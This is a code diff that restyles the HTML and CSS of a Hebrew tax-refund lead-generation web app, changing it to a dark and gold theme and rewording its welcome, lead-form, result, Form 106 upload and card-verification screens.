@@ -3,26 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>החזר מס – בודקים בכמה מגיע לך</title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
+  <title>מיסה – החזר מס אוטומטי</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;700;800;900&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
-    html,
-    body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    html, body { height: 100%; margin: 0; padding: 0; }
     body {
       font-family: 'Heebo', sans-serif;
-      background: linear-gradient(135deg, #0b1121 0%, #1a1f36 50%, #0f1a2e 100%);
+      background: #060b14;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -33,93 +23,105 @@
       width: 100%;
       max-width: 430px;
       min-height: 100vh;
-      background: #ffffff;
+      background: #0B0F19;
       position: relative;
       display: flex;
       flex-direction: column;
-      box-shadow: 0 0 60px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 0 80px rgba(0, 0, 0, 0.6);
       overflow: hidden;
+    }
+    /* subtle radial glow behind main container */
+    #app::before {
+      content: '';
+      position: absolute;
+      top: -30%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(212, 175, 55, 0.04) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
     }
 
     /* ─── Header ─── */
     .app-header {
-      background: linear-gradient(135deg, #1a56db 0%, #0d3b9e 100%);
-      padding: 18px 20px 14px;
+      background: linear-gradient(180deg, #0F172A 0%, #0B0F19 100%);
+      padding: 20px 22px 14px;
       color: #fff;
       flex-shrink: 0;
       position: relative;
       z-index: 10;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
     }
     .app-header .top-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
     }
     .app-header .logo {
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 10px;
       font-weight: 800;
-      font-size: 20px;
+      font-size: 22px;
       letter-spacing: -0.3px;
+      color: #fff;
     }
     .app-header .logo-icon {
-      width: 32px;
-      height: 32px;
-      background: rgba(255, 255, 255, 0.2);
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #D4AF37, #C5A880);
       border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 18px;
+      font-size: 16px;
+      font-weight: 900;
+      color: #0B0F19;
     }
     .app-header .badge {
-      background: rgba(255, 255, 255, 0.18);
-      padding: 4px 12px;
+      border: 1px solid rgba(212, 175, 55, 0.25);
+      padding: 5px 14px;
       border-radius: 20px;
       font-size: 12px;
-      font-weight: 500;
+      font-weight: 600;
       display: flex;
       align-items: center;
-      gap: 4px;
+      gap: 6px;
+      color: #D4AF37;
       backdrop-filter: blur(4px);
     }
     .app-header .badge .dot {
-      width: 7px;
-      height: 7px;
-      background: #34d399;
+      width: 6px;
+      height: 6px;
+      background: #D4AF37;
       border-radius: 50%;
       display: inline-block;
-      animation: pulse-dot 1.8s infinite;
+      animation: pulse-dot 2s infinite;
     }
     @keyframes pulse-dot {
-      0%,
-      100% {
-        opacity: 1;
-        transform: scale(1);
-      }
-      50% {
-        opacity: 0.5;
-        transform: scale(0.85);
-      }
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.8); }
     }
 
     /* ─── Refund Counter ─── */
     .refund-counter {
-      background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+      background: linear-gradient(135deg, rgba(212, 175, 55, 0.08) 0%, rgba(212, 175, 55, 0.02) 100%);
+      border: 1px solid rgba(212, 175, 55, 0.12);
       border-radius: 14px;
       padding: 14px 18px;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      color: #1a1a2e;
+      color: #fff;
       margin-top: 2px;
     }
     .refund-counter .label {
       font-size: 13px;
-      font-weight: 700;
-      opacity: 0.8;
+      font-weight: 600;
+      color: #94A3B8;
     }
     .refund-counter .amount {
       font-size: 28px;
@@ -129,6 +131,7 @@
       display: flex;
       align-items: center;
       gap: 2px;
+      color: #D4AF37;
     }
     .refund-counter .amount .currency {
       font-size: 18px;
@@ -142,42 +145,45 @@
     }
     .refund-counter .zero-risk {
       font-size: 11px;
-      font-weight: 600;
-      background: rgba(0, 0, 0, 0.1);
+      font-weight: 500;
+      background: rgba(212, 175, 55, 0.1);
       padding: 3px 10px;
       border-radius: 10px;
       white-space: nowrap;
+      color: #D4AF37;
     }
 
     /* ─── Progress Bar ─── */
     .progress-section {
-      padding: 14px 20px 6px;
+      padding: 14px 22px 6px;
       flex-shrink: 0;
+      position: relative;
+      z-index: 5;
     }
     .progress-bar-track {
       width: 100%;
-      height: 6px;
-      background: #e5e7eb;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.06);
       border-radius: 10px;
       overflow: hidden;
     }
     .progress-bar-fill {
       height: 100%;
       width: 0%;
-      background: linear-gradient(90deg, #1a56db, #3b82f6);
+      background: linear-gradient(90deg, #D4AF37, #C5A880);
       border-radius: 10px;
-      transition: width 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+      transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
     .progress-labels {
       display: flex;
       justify-content: space-between;
-      margin-top: 5px;
-      font-size: 12px;
-      color: #9ca3af;
+      margin-top: 6px;
+      font-size: 11px;
+      color: rgba(148, 163, 184, 0.5);
       font-weight: 500;
     }
     .progress-labels .step.active {
-      color: #1a56db;
+      color: #D4AF37;
       font-weight: 700;
     }
 
@@ -185,69 +191,56 @@
     .chat-area {
       flex: 1;
       overflow-y: auto;
-      padding: 16px 18px 10px;
+      padding: 16px 20px 10px;
       display: flex;
       flex-direction: column;
       gap: 14px;
       scroll-behavior: smooth;
-      background: #f8fafc;
+      position: relative;
+      z-index: 2;
     }
-    .chat-area::-webkit-scrollbar {
-      width: 4px;
-    }
-    .chat-area::-webkit-scrollbar-thumb {
-      background: #cbd5e1;
-      border-radius: 10px;
-    }
+    .chat-area::-webkit-scrollbar { width: 3px; }
+    .chat-area::-webkit-scrollbar-thumb { background: rgba(212, 175, 55, 0.2); border-radius: 10px; }
 
     /* ─── Bubbles ─── */
     .bubble {
       max-width: 88%;
-      padding: 14px 18px;
-      border-radius: 18px;
+      padding: 14px 20px;
+      border-radius: 16px;
       font-size: 15px;
-      line-height: 1.6;
+      line-height: 1.7;
       animation: fadeUp 0.5s ease forwards;
       opacity: 0;
       transform: translateY(12px);
       word-wrap: break-word;
     }
     @keyframes fadeUp {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      to { opacity: 1; transform: translateY(0); }
     }
     .bubble.bot {
       align-self: flex-start;
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      color: #1e293b;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      color: #E2E8F0;
       border-bottom-right-radius: 4px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
     }
     .bubble.user {
       align-self: flex-end;
-      background: linear-gradient(135deg, #1a56db, #2563eb);
+      background: linear-gradient(135deg, rgba(212, 175, 55, 0.15) 0%, rgba(212, 175, 55, 0.05) 100%);
+      border: 1px solid rgba(212, 175, 55, 0.15);
       color: #fff;
       border-bottom-left-radius: 4px;
-      box-shadow: 0 4px 14px rgba(26, 86, 219, 0.25);
     }
     .bubble.system {
       align-self: center;
-      background: #fef9c3;
-      border: 1px solid #fde68a;
-      color: #92400e;
+      background: rgba(212, 175, 55, 0.04);
+      border: 1px solid rgba(212, 175, 55, 0.08);
+      color: #D4AF37;
       font-size: 13px;
-      font-weight: 600;
+      font-weight: 500;
       text-align: center;
       max-width: 95%;
-      border-radius: 14px;
-    }
-    .bubble.system .icon {
-      font-size: 20px;
-      display: block;
-      margin-bottom: 4px;
+      border-radius: 12px;
     }
     .bubble .typing-dots {
       display: flex;
@@ -255,27 +248,17 @@
       padding: 4px 0;
     }
     .bubble .typing-dots span {
-      width: 9px;
-      height: 9px;
-      background: #94a3b8;
+      width: 8px;
+      height: 8px;
+      background: rgba(212, 175, 55, 0.5);
       border-radius: 50%;
       animation: typingBounce 1.4s infinite;
     }
-    .bubble .typing-dots span:nth-child(2) {
-      animation-delay: 0.2s;
-    }
-    .bubble .typing-dots span:nth-child(3) {
-      animation-delay: 0.4s;
-    }
+    .bubble .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .bubble .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
     @keyframes typingBounce {
-      0%,
-      60%,
-      100% {
-        transform: translateY(0);
-      }
-      30% {
-        transform: translateY(-8px);
-      }
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-8px); }
     }
 
     /* ─── Question Buttons ─── */
@@ -291,15 +274,15 @@
       margin-top: -4px;
     }
     .option-btn {
-      background: #fff;
-      border: 2px solid #e2e8f0;
-      padding: 10px 20px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 10px 22px;
       border-radius: 50px;
       font-size: 15px;
       font-weight: 600;
-      color: #1e293b;
+      color: #E2E8F0;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.3s ease;
       font-family: inherit;
       flex: 1 1 auto;
       min-width: 70px;
@@ -307,25 +290,24 @@
       touch-action: manipulation;
     }
     .option-btn:hover {
-      border-color: #1a56db;
-      background: #eff6ff;
+      border-color: rgba(212, 175, 55, 0.3);
+      background: rgba(212, 175, 55, 0.08);
     }
-    .option-btn:active {
-      transform: scale(0.96);
-    }
+    .option-btn:active { transform: scale(0.96); }
     .option-btn.selected {
-      border-color: #1a56db;
-      background: #1a56db;
-      color: #fff;
-      box-shadow: 0 4px 12px rgba(26, 86, 219, 0.3);
+      border-color: #D4AF37;
+      background: rgba(212, 175, 55, 0.15);
+      color: #D4AF37;
+      box-shadow: 0 4px 20px rgba(212, 175, 55, 0.15);
     }
 
     /* ─── Input Area ─── */
     .input-area {
       flex-shrink: 0;
-      padding: 12px 18px 18px;
-      background: #fff;
-      border-top: 1px solid #e5e7eb;
+      padding: 14px 20px 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.04);
+      position: relative;
+      z-index: 5;
     }
     .input-area .lead-form {
       display: flex;
@@ -336,91 +318,91 @@
     .input-area .lead-form input {
       width: 100%;
       padding: 14px 18px;
-      border: 2px solid #e2e8f0;
-      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
       font-size: 15px;
       font-family: inherit;
       text-align: right;
       direction: rtl;
       outline: none;
-      transition: border 0.2s;
+      transition: border 0.25s ease;
+      color: #fff;
     }
+    .input-area .lead-form input::placeholder { color: rgba(148, 163, 184, 0.4); }
     .input-area .lead-form input:focus {
-      border-color: #1a56db;
+      border-color: rgba(212, 175, 55, 0.3);
     }
     .submit-btn {
-      background: linear-gradient(135deg, #1a56db, #2563eb);
-      color: #fff;
+      background: linear-gradient(135deg, #D4AF37 0%, #C5A880 100%);
+      color: #0B0F19;
       border: none;
       padding: 16px 28px;
-      border-radius: 14px;
+      border-radius: 12px;
       font-size: 17px;
       font-weight: 800;
       cursor: pointer;
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       font-family: inherit;
-      box-shadow: 0 6px 20px rgba(26, 86, 219, 0.35);
+      box-shadow: 0 6px 24px rgba(212, 175, 55, 0.2);
       width: 100%;
       letter-spacing: 0.3px;
       position: relative;
       overflow: hidden;
     }
     .submit-btn:hover {
-      background: linear-gradient(135deg, #1d4ed8, #1a56db);
-      box-shadow: 0 8px 28px rgba(26, 86, 219, 0.45);
+      background: linear-gradient(135deg, #C5A880 0%, #B8993E 100%);
+      box-shadow: 0 8px 32px rgba(212, 175, 55, 0.3);
       transform: translateY(-1px);
     }
     .submit-btn:active {
       transform: scale(0.97);
-      box-shadow: 0 3px 12px rgba(26, 86, 219, 0.3);
+      box-shadow: 0 3px 16px rgba(212, 175, 55, 0.15);
     }
     .submit-btn:disabled {
-      opacity: 0.5;
+      opacity: 0.4;
       cursor: not-allowed;
       transform: none;
       box-shadow: none;
     }
-    .submit-btn.green {
-      background: linear-gradient(135deg, #059669, #10b981);
-      box-shadow: 0 6px 20px rgba(5, 150, 105, 0.35);
+    .submit-btn.gold-outline {
+      background: transparent;
+      border: 1px solid rgba(212, 175, 55, 0.3);
+      color: #D4AF37;
+      box-shadow: none;
     }
-    .submit-btn.green:hover {
-      background: linear-gradient(135deg, #047857, #059669);
-      box-shadow: 0 8px 28px rgba(5, 150, 105, 0.45);
-    }
-    .submit-btn.green:active {
-      box-shadow: 0 3px 12px rgba(5, 150, 105, 0.3);
+    .submit-btn.gold-outline:hover {
+      background: rgba(212, 175, 55, 0.06);
+      box-shadow: none;
     }
     .skip-btn {
-      background: #f8fafc;
-      border: 2px solid #e2e8f0;
-      color: #64748b;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      color: #64748B;
       padding: 10px 20px;
       border-radius: 12px;
       font-size: 14px;
-      font-weight: 600;
+      font-weight: 500;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.25s ease;
       font-family: inherit;
       width: 100%;
       text-align: center;
     }
     .skip-btn:hover {
-      background: #f1f5f9;
-      border-color: #cbd5e1;
-      color: #475569;
+      background: rgba(255, 255, 255, 0.04);
+      border-color: rgba(255, 255, 255, 0.1);
+      color: #94A3B8;
     }
-    .skip-btn:active {
-      transform: scale(0.97);
-    }
+    .skip-btn:active { transform: scale(0.97); }
     .input-area .lead-form .disclaimer {
       font-size: 12px;
-      color: #9ca3af;
+      color: rgba(148, 163, 184, 0.5);
       text-align: center;
-      line-height: 1.4;
+      line-height: 1.5;
     }
     .input-area .lead-form .disclaimer strong {
-      color: #1a56db;
+      color: #D4AF37;
     }
 
     /* ─── Welcome Screen ─── */
@@ -430,85 +412,96 @@
       justify-content: center;
       align-items: center;
       flex: 1;
-      padding: 30px 24px 40px;
+      padding: 40px 28px;
       text-align: center;
-      background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
+      position: relative;
+      z-index: 2;
     }
-    .welcome-screen .emoji-big {
-      font-size: 64px;
-      margin-bottom: 10px;
-      animation: float 3s ease-in-out infinite;
+    .welcome-screen .brand-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, rgba(212, 175, 55, 0.12), rgba(212, 175, 55, 0.04));
+      border: 1px solid rgba(212, 175, 55, 0.15);
+      border-radius: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      font-weight: 900;
+      color: #D4AF37;
+      margin-bottom: 18px;
+      animation: float 4s ease-in-out infinite;
     }
     @keyframes float {
-      0%,
-      100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
     }
     .welcome-screen h1 {
-      font-size: 25px;
+      font-size: 26px;
       font-weight: 900;
-      color: #0f172a;
-      line-height: 1.4;
-      margin: 0 0 12px;
+      color: #fff;
+      line-height: 1.5;
+      margin: 0 0 14px;
     }
     .welcome-screen h1 .highlight {
-      color: #1a56db;
+      color: #D4AF37;
     }
     .welcome-screen .sub {
-      font-size: 16px;
-      color: #475569;
-      line-height: 1.6;
+      font-size: 15px;
+      color: #64748B;
+      line-height: 1.7;
       max-width: 320px;
       margin: 0 auto 20px;
+    }
+    .welcome-screen .sub strong {
+      color: #94A3B8;
     }
     .welcome-screen .usp-grid {
       display: flex;
       flex-wrap: wrap;
       justify-content: center;
-      gap: 10px;
-      margin-bottom: 24px;
+      gap: 8px;
+      margin-bottom: 22px;
     }
     .welcome-screen .usp-item {
-      background: #f1f5f9;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
       padding: 8px 16px;
       border-radius: 30px;
       font-size: 13px;
-      font-weight: 600;
-      color: #1e293b;
+      font-weight: 500;
+      color: #94A3B8;
       display: flex;
       align-items: center;
       gap: 6px;
     }
     .welcome-screen .fee-badge {
-      background: linear-gradient(135deg, #fbbf24, #f59e0b);
-      padding: 10px 24px;
+      border: 1px solid rgba(212, 175, 55, 0.2);
+      padding: 10px 28px;
       border-radius: 50px;
       font-weight: 800;
       font-size: 18px;
-      color: #1a1a2e;
-      margin-bottom: 20px;
-      box-shadow: 0 4px 16px rgba(245, 158, 11, 0.3);
+      color: #D4AF37;
+      margin-bottom: 22px;
+      background: rgba(212, 175, 55, 0.04);
     }
     .welcome-screen .fee-badge small {
       font-size: 13px;
       font-weight: 500;
+      color: #94A3B8;
     }
     .welcome-btn {
-      background: linear-gradient(135deg, #1a56db, #2563eb);
-      color: #fff;
+      background: linear-gradient(135deg, #D4AF37 0%, #C5A880 100%);
+      color: #0B0F19;
       border: none;
       padding: 18px 48px;
       border-radius: 60px;
       font-size: 20px;
       font-weight: 800;
       cursor: pointer;
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       font-family: inherit;
-      box-shadow: 0 8px 30px rgba(26, 86, 219, 0.35);
+      box-shadow: 0 8px 32px rgba(212, 175, 55, 0.2);
       width: 100%;
       max-width: 300px;
       letter-spacing: 0.3px;
@@ -516,18 +509,18 @@
       overflow: hidden;
     }
     .welcome-btn:hover {
-      background: linear-gradient(135deg, #1d4ed8, #1a56db);
-      box-shadow: 0 12px 40px rgba(26, 86, 219, 0.45);
+      background: linear-gradient(135deg, #C5A880 0%, #B8993E 100%);
+      box-shadow: 0 12px 48px rgba(212, 175, 55, 0.3);
       transform: translateY(-2px);
     }
     .welcome-btn:active {
       transform: scale(0.96);
-      box-shadow: 0 4px 16px rgba(26, 86, 219, 0.25);
+      box-shadow: 0 4px 20px rgba(212, 175, 55, 0.15);
     }
     .welcome-screen .confidence {
-      margin-top: 18px;
+      margin-top: 20px;
       font-size: 13px;
-      color: #94a3b8;
+      color: rgba(148, 163, 184, 0.4);
       display: flex;
       align-items: center;
       gap: 6px;
@@ -540,14 +533,27 @@
       justify-content: center;
       align-items: center;
       flex: 1;
-      padding: 30px 24px;
+      padding: 40px 28px;
       text-align: center;
-      background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
+      position: relative;
+      z-index: 2;
+    }
+    .result-screen .result-icon {
+      width: 72px;
+      height: 72px;
+      background: linear-gradient(135deg, rgba(212, 175, 55, 0.1), rgba(212, 175, 55, 0.03));
+      border: 1px solid rgba(212, 175, 55, 0.12);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      margin-bottom: 10px;
     }
     .result-screen .big-result {
       font-size: 56px;
       font-weight: 900;
-      color: #1a56db;
+      color: #D4AF37;
       direction: ltr;
       line-height: 1;
       margin: 8px 0;
@@ -558,26 +564,111 @@
     .result-screen .result-label {
       font-size: 18px;
       font-weight: 700;
-      color: #0f172a;
+      color: #fff;
       margin-bottom: 4px;
     }
     .result-screen .result-sub {
       font-size: 14px;
-      color: #64748b;
+      color: #64748B;
       max-width: 280px;
       margin: 0 auto 20px;
     }
     .result-screen .fee-note {
-      background: #fef9c3;
+      background: rgba(212, 175, 55, 0.04);
+      border: 1px solid rgba(212, 175, 55, 0.08);
       padding: 10px 20px;
-      border-radius: 14px;
+      border-radius: 12px;
       font-size: 14px;
-      font-weight: 600;
-      color: #92400e;
+      font-weight: 500;
+      color: #D4AF37;
       margin-bottom: 20px;
     }
     .result-screen .fee-note strong {
-      color: #1a56db;
+      color: #fff;
+    }
+    .result-screen .action-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 100%;
+      max-width: 280px;
+      margin-top: 4px;
+    }
+    .result-screen .action-group .submit-btn {
+      border-radius: 60px;
+      padding: 14px 28px;
+      font-size: 16px;
+    }
+
+    /* ─── Upload / Payment shared ─── */
+    .result-screen .form-card {
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .result-screen .form-card input,
+    .result-screen .form-card .file-drop {
+      width: 100%;
+      padding: 14px 18px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      font-size: 15px;
+      font-family: inherit;
+      text-align: right;
+      direction: rtl;
+      outline: none;
+      transition: border 0.25s ease, background 0.25s ease;
+      color: #fff;
+    }
+    .result-screen .form-card input::placeholder { color: rgba(148, 163, 184, 0.35); }
+    .result-screen .form-card input:focus {
+      border-color: rgba(212, 175, 55, 0.3);
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .result-screen .form-card .file-drop {
+      border-style: dashed;
+      text-align: center;
+      padding: 24px 18px;
+      color: #64748B;
+      cursor: pointer;
+    }
+    .result-screen .form-card .file-drop:hover {
+      border-color: rgba(212, 175, 55, 0.2);
+      background: rgba(212, 175, 55, 0.03);
+    }
+    .result-screen .form-card .row-duo {
+      display: flex;
+      gap: 8px;
+    }
+    .result-screen .form-card .row-duo input {
+      flex: 1;
+      text-align: left;
+      direction: ltr;
+    }
+    .result-screen .form-card .submit-btn {
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 17px;
+    }
+    .result-screen .form-card .skip-btn {
+      margin-top: -2px;
+    }
+    .result-screen .security-badges {
+      display: flex;
+      gap: 10px;
+      margin-top: 14px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .result-screen .security-badges span {
+      font-size: 11px;
+      color: rgba(148, 163, 184, 0.4);
+      display: flex;
+      align-items: center;
+      gap: 4px;
     }
 
     /* ─── Confetti Canvas ─── */
@@ -591,10 +682,12 @@
       z-index: 999;
     }
 
-    /* ─── ─── */
-    .hidden {
-      display: none !important;
-    }
+    /* ─── Utility ─── */
+    .hidden { display: none !important; }
+    .status-msg { font-size: 13px; text-align: center; }
+    .error-msg { color: #EF4444; font-weight: 600; }
+    .success-msg { color: #D4AF37; font-weight: 500; }
+    .neutral-msg { color: #64748B; }
   </style>
 </head>
 <body>
@@ -605,18 +698,18 @@
     <div class="app-header">
       <div class="top-row">
         <div class="logo">
-          <span class="logo-icon">💸</span>
+          <span class="logo-icon">מ</span>
           <span>מיסה</span>
         </div>
         <div class="badge">
           <span class="dot"></span>
-          בדיקה חינם
+          בדיקה פיננסית
         </div>
       </div>
       <div class="refund-counter" id="refundCounter">
         <div>
-          <div class="label">💰 החזר משוער</div>
-          <div class="zero-risk">* אפס סיכון</div>
+          <div class="label">החזר משוער</div>
+          <div class="zero-risk">ללא התחייבות</div>
         </div>
         <div class="amount">
           <span class="currency">₪</span>
@@ -631,39 +724,39 @@
         <div class="progress-bar-fill" id="progressFill"></div>
       </div>
       <div class="progress-labels">
-        <span class="step" data-step="0">התחלה</span>
-        <span class="step" data-step="1">עבודה</span>
-        <span class="step" data-step="2">תעסוקה</span>
-        <span class="step" data-step="3">לימודים</span>
+        <span class="step" data-step="0">פתיחה</span>
+        <span class="step" data-step="1">תעסוקה</span>
+        <span class="step" data-step="2">הכנסה</span>
+        <span class="step" data-step="3">השכלה</span>
         <span class="step" data-step="4">בריאות</span>
-        <span class="step" data-step="5">סיום</span>
+        <span class="step" data-step="5">סיכום</span>
       </div>
     </div>
 
     <!-- ─── Welcome ─── -->
     <div class="welcome-screen" id="welcomeScreen">
-      <div class="emoji-big">🤑</div>
+      <div class="brand-icon">מ</div>
       <h1>
-        ידעת שהמדינה כנראה<br>
-        <span class="highlight">חייבת לך אלפי שקלים</span><br>
-        ואתה אפילו לא יודע?
+        ייתכן ואתם זכאים<br>
+        ל<span class="highlight">החזר מס</span> משמעותי<br>
+        מבלי לדעת על כך
       </h1>
       <div class="sub">
-        בוא נבדוק ב-<strong>60 שניות</strong> - 100% חינם!<br>
-        משלמים רק <strong>12%</strong> עמלה ורק אם הכסף נכנס אליך לחשבון.
+        בדיקה פיננסית מקיפה ב-<strong>60 שניות</strong> — ללא עלות וללא התחייבות.<br>
+        עמלת הצלחה של <strong>12%</strong> בלבד, ובתנאי שהכסף התקבל בחשבונכם.
       </div>
       <div class="usp-grid">
-        <span class="usp-item">⚡ 60 שניות</span>
-        <span class="usp-item">✅ 100% חינם</span>
-        <span class="usp-item">🔒 מאובטח</span>
-        <span class="usp-item">📱 פשוט ברמות</span>
+        <span class="usp-item">60 שניות</span>
+        <span class="usp-item">ללא עלות</span>
+        <span class="usp-item">מאובטח</span>
+        <span class="usp-item">דיגיטלי</span>
       </div>
       <div class="fee-badge">
-        12% עמלה <small>בלבד! (השוק: 20%)</small>
+        12% עמלה <small>מול 20% בשוק</small>
       </div>
-      <button class="welcome-btn" id="startBtn">בואו נתחיל 🚀</button>
+      <button class="welcome-btn" id="startBtn">לתחילת הבדיקה</button>
       <div class="confidence">
-        <span>🔐</span> הפרטים שלך בטוחים איתנו
+        פרטיכם מאובטחים במערכת מוצפנת
       </div>
     </div>
 
@@ -673,104 +766,102 @@
     <!-- ─── Input Area ─── -->
     <div class="input-area hidden" id="inputArea">
       <div class="lead-form" id="leadForm">
-        <input type="tel" id="phoneInput" placeholder="📱 מספר נייד" dir="rtl" inputmode="tel" />
-        <input type="text" id="nameInput" placeholder="👤 שם מלא" dir="rtl" />
-        <button class="submit-btn" id="leadSubmit">שלחו לי את התוצאה! 🎯</button>
+        <input type="tel" id="phoneInput" placeholder="טלפון נייד" dir="rtl" inputmode="tel" />
+        <input type="text" id="nameInput" placeholder="שם מלא" dir="rtl" />
+        <button class="submit-btn" id="leadSubmit">קבלת תוצאת הבדיקה</button>
         <div class="disclaimer">
-          שליחת הפרטים מהווה הסכמה לתנאי השימוש. נשמור על הפרטים שלך ולא נעביר לגורם שלישי. <strong>בדיקה完全没有</strong> התחייבות.
+          שליחת הפרטים מהווה הסכמה לתנאי השימוש. הפרטים ישמשו אך ורק לצורך בדיקת זכאותכם להחזר מס.
         </div>
       </div>
     </div>
 
     <!-- ─── Result (after lead submit) ─── -->
     <div class="result-screen" id="resultScreen">
-      <div style="font-size:60px;margin-bottom:6px;">🎉</div>
-      <div class="result-label">החזר מס משוער:</div>
+      <div class="result-icon">₪</div>
+      <div class="result-label">החזר מס משוער</div>
       <div class="big-result">
         <span class="currency">₪</span><span id="finalRefund">0</span>
       </div>
       <div class="result-sub">
-        הסכום מבוסס על התשובות שלך. נציג יחזור אליך עם בדיקה מדויקת.
+        הסכום מבוסס על ניתוח התשובות שהזנתם. נציג מטעמנו יבצע בדיקה מדויקת מול רשות המיסים ויעדכן אתכם.
       </div>
       <div class="fee-note">
-        💡 <strong>12%</strong> עמלה רק על מה שמתקבל — <strong>88%</strong> לך!
+        <strong>12%</strong> עמלת הצלחה — <strong>88%</strong> לכם
       </div>
-      <button class="submit-btn" id="uploadBtn" style="margin-top:6px;max-width:260px;border-radius:60px;padding:14px 30px;font-size:16px;">
-        📎 העלה טופס 106
-      </button>
-      <div style="font-size:12px;color:#94a3b8;margin-top:10px;">אפשר גם מאוחר יותר</div>
-      <button class="submit-btn green" id="gotoPaymentBtn" style="margin-top:8px;max-width:220px;border-radius:60px;padding:12px 24px;font-size:15px;">
-        💳 אמת כרטיס וסיים
-      </button>
+      <div class="action-group">
+        <button class="submit-btn" id="uploadBtn">
+          העלאת טופס 106
+        </button>
+        <button class="submit-btn gold-outline" id="gotoPaymentBtn">
+          אימות כרטיס אשראי
+        </button>
+        <div style="font-size:12px;color:rgba(148,163,184,0.4);margin-top:-2px;">ניתן להשלים כל שלב בנפרד</div>
+      </div>
     </div>
 
     <!-- ─── Upload Screen ─── -->
     <div class="result-screen" id="uploadScreen" style="display:none;">
-      <div style="font-size:48px;margin-bottom:6px;">📄</div>
+      <div class="result-icon">&#8207;</div>
       <div class="result-label">העלאת טופס 106</div>
       <div class="result-sub">
-        העלה את טופס 106 שקיבלת מהמעסיק. אפשר לצלם ולשלוח.
+        יש להעלות את טופס 106 שהתקבל מהמעסיק. ניתן לצלם ולשלוח ישירות מהמכשיר הנייד.
       </div>
-      <form id="uploadForm" style="width:100%;max-width:300px;display:flex;flex-direction:column;gap:12px;">
-        <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" multiple
-               style="padding:12px;border:2px dashed #cbd5e1;border-radius:14px;text-align:center;font-size:14px;background:#f8fafc;cursor:pointer;" />
-        <button type="submit" class="submit-btn" id="uploadSubmit" style="border-radius:14px;padding:16px;font-size:17px;">
-          📤 העלה מסמכים
+      <form id="uploadForm" class="form-card">
+        <label class="file-drop" id="fileDropLabel">
+          <div style="font-size:14px;margin-bottom:4px;color:#64748B;">לחצו לבחירת קבצים</div>
+          <div style="font-size:11px;color:rgba(148,163,184,0.3);">PDF, JPG, PNG, DOC — עד 15MB לקובץ</div>
+        </label>
+        <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" multiple style="display:none;" />
+        <button type="submit" class="submit-btn" id="uploadSubmit">
+          העלאת מסמכים
         </button>
-        <div id="uploadStatus" style="font-size:13px;color:#64748b;text-align:center;"></div>
+        <div id="uploadStatus" class="status-msg neutral-msg"></div>
